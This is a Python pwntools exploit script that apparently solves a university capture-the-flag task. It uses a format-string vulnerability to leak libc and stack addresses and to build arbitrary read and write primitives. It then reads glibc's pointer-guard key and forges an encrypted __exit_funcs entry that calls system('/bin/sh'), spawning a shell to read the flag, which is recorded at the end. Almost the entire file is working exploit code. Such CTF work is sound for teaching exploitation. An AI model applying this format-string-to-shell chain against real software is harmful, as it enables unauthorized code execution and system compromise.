from pwn import *
import string
from sys import argv
import os
import time
import subprocess

context.arch = 'amd64'
context.os = 'linux'
info = log.info
#context.log_level = 'debug'

elf = context.binary = ELF('vuln')
libc = ELF("./libc.so.6")

# for debugging
gdbscript = '''
file vuln
b main
b *(main+108)
b exit
'''.format(**locals())
#p = gdb.debug(["./vuln"], gdbscript=gdbscript, )
with open("gdbscript", "w") as f:
    f.write(gdbscript)


#p=remote("127.0.0.1", 1024)

#p2=process('tmux split-window -h gdb -x gdbscript -p $(pgrep -n vuln)', shell=True)
#input()
#sleep(1)

# start remote
p = remote('tasks.ws24.softsec.rub.de', 33371)


def enumerate_rev(iterable):
    return zip(reversed(range(len(iterable))), iter(reversed(iterable)))


def send_format_string(fmt):
    for i, b in enumerate_rev(fmt+b"\0"):
        #p.recvuntil(b"Option? 1:set 2:print\n> ")
        #p.sendline(b"1")
        #p.recvuntil(b"What is the length of the new format?\n> ")
        #p.sendline(f"{i+1}".encode())
        p.sendline(f"1\n{i+1}".encode())
        #p.recvuntil(b"What is the new format?\n> ")
        p.send(b"A"*i+p8(b))

def get_output():
    #p.recvuntil(b"Option? 1:set 2:print\n> ")
    p.sendline(b"2")
    p.recvuntil(b"Output:\n")
    return p.recvline()

def convert_leaked_ptr(ptr):
    return int(ptr.decode()[2:], 16)

send_format_string(b"%p "*62)
ptrs = get_output().split(b" ")
print({i: c for i, c in enumerate(ptrs)})

vuln_addr = convert_leaked_ptr(ptrs[61])-0x40
libc_addr = convert_leaked_ptr(ptrs[2])-1016384


libc = ELF("./libc.so.6")
libc.address = libc_addr


def write_arbitrary_ptr(ptr: bytes):
    for i in range(8):
        # use pointer on stack to overwrite another pointer on stack to point to 0-7th byte of another value on the stack:
        # 00:0000│+011 0x7ffeca97df08 —▸ 0x7ffeca97e038 —▸ [0x7ffeca97ef00-0x7ffeca97ef07]
        payload = f"%{0x10+i}c%18$hhn".encode()
        send_format_string(payload)
        #print(f"pointer payload: {payload}")
        get_output()
        
        # we use this adjusted pointer to write 8 byte arbitrarily onto the stack
        payload = f"{'A'*ptr[i]}%47$hhn".encode()
        send_format_string(payload)
        #print(f"setting payload: {payload}")
        get_output()


def convert_leaked_ptr_of_written_addr(ptr):
    return int(ptr.decode()[2:-2]+"10", 16) #same 10 as 0x10 in above function (write_arbitrary_ptr) as we can not write 0 chars with %Xc

def write_arbitrary_value_to_arbitrary_ptr(ptr: bytes, value: bytes):
    stack_frame_start_addr = convert_leaked_ptr(ptrs[11])-344
    position_of_written_pointer = (convert_leaked_ptr_of_written_addr(ptrs[46])-stack_frame_start_addr)//8 + 6 #+6 for register arguments
    for i in range(8):
        write_arbitrary_ptr(p64(int.from_bytes(ptr, 'little')+i))

        # now let's write our arbitrary value to an actually arbitrary pointer ^^
        payload = f"{'A'*value[i]}%{position_of_written_pointer}$hhn".encode()
        send_format_string(payload)
        #print(f"setting payload: {payload}")
        get_output()


def read_arbitrary_value(ptr: bytes):
    stack_frame_start_addr = convert_leaked_ptr(ptrs[11])-344
    position_of_written_pointer = (convert_leaked_ptr_of_written_addr(ptrs[46])-stack_frame_start_addr)//8 + 6 #+6 for register arguments

    value = b""
    # now let's read the value from an actually arbitrary pointer ^^
    for i in range(8):
        write_arbitrary_ptr(p64(int.from_bytes(ptr, 'little')+i))
        
        payload = f"%{position_of_written_pointer}$s".encode() #string seems to be the only specifier reading from a pointer, so we grab characters byte per byte (problem of 0 bytes)
        send_format_string(payload)
        #print(f"reading payload: {payload}")
        val = get_output()
        if(len(val) > 1): # if more than just \n
            value += p8(val[0])
        else:             # read a zero byte
            value += b"\x00"
    return value[::-1]



#p $fs_base to TCB address
# 140347261982528 - libc base addr = offset of tcb in libc
tcb_offset = 140347261982528 - 0x7fa524b24000

exit_hook_key_addr = libc_addr + tcb_offset + 0x30


# https://ctftime.org/writeup/35951 set pointer_guard to all 0es so we don't need the key anymore
# we can actually read the key, so this is not necessary, but anyway
print(f"exit_hook_key_addr: {hex(exit_hook_key_addr)}")
# original key
key = int(read_arbitrary_value(p64(exit_hook_key_addr)).hex(), 16)
#write_arbitrary_value_to_arbitrary_ptr(p64(exit_hook_key_addr), b"\xDE\x00\xBE\xEF\xDE\xAD\xBE\xEF"[::-1]) # set key to 0
#write_arbitrary_value_to_arbitrary_ptr(p64(exit_hook_key_addr), b"\x00"*8) # set key to 0
# verify key is reset to all 0es
#print(read_arbitrary_value(p64(exit_hook_key_addr)))






#print(f"__exit_funcs: {libc.symbols['__exit_funcs']}")

# b exit
# step into libc exit()
# this func only calls _run_exit_handlers
#    the given argument is a ptr to __exit_funcs: 
#    https://elixir.bootlin.com/glibc/glibc-2.36/source/stdlib/cxa_atexit.c#L75
#    https://elixir.bootlin.com/glibc/glibc-2.36/source/stdlib/exit.h#L57
# so we go into exit(), take the rsi argument: 0x7f67fc379820 and add +0x10 to this to reach an array of struct exit_function fns[32];
# https://elixir.bootlin.com/glibc/glibc-2.36/source/stdlib/exit.h#L34
# we write a pointer to stack memory at +0x10
# we use our write_arbitrary_value_to_arbitrary_ptr function to write at that address an valid exit_function object which contains the address to system as well as pointer to "/bin/sh" which we also write to the stack using write_arbitrary_value_to_arbitrary_ptr



# The shifts are copied from the above blogpost
# Rotate left: 0b1001 --> 0b0011
rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

# encrypt a function pointer
def encrypt(v, key):
    return p64(rol(v ^ key, 0x11, 64))



onexit_fun_location = convert_leaked_ptr(ptrs[11])

#######  arg val   |   next | count  | type (cxa) | addr                             | arg                                | not used
onexit_fun_payload = p64(0) + p64(1) + p64(4)     + encrypt(libc.sym['system'], key) + p64(next(libc.search(b'/bin/sh'))) + p64(0)


groups = [onexit_fun_payload[i:i+8] for i in range(0, len(onexit_fun_payload), 8)]
if len(groups[-1]) < 8:
    groups[-1] = groups[-1].rjust(8, b"\x00")

for i in range(len(groups)-1):
    write_arbitrary_value_to_arbitrary_ptr(p64(onexit_fun_location+i*8), groups[i])

__exit_funcs_offset = 0x7f3baa5c4820-0x7f3baa3f2000 # see huge comment above
__exit_funcs_addr = libc_addr + __exit_funcs_offset
__exit_funcs_array_first_addr = __exit_funcs_addr#+0x10 - actually at start of struct because reordering I guess?
write_arbitrary_value_to_arbitrary_ptr(p64(__exit_funcs_array_first_addr), p64(onexit_fun_location))

print(f"__exit_funcs_array_first_addr: {hex(__exit_funcs_array_first_addr)}")
print(f"onexit_fun_location: {hex(onexit_fun_location)}")
print(f"encrypt(libc.sym['system'], key): {encrypt(libc.sym['system'], key).hex()}")
print(f"libc.sym['system']: {hex(libc.sym['system'])}")







p.sendline(b"3") # cause exit to be called

# get flag
p.sendline(b"cat /flag")

# see outputted flag
p.interactive()

#softsec{uXGn3pgXEQm-vlpI34a1fcLsAxLwCYJ78NFaiF1oXCiuCBP6hUSBIfaBppvIAsAA}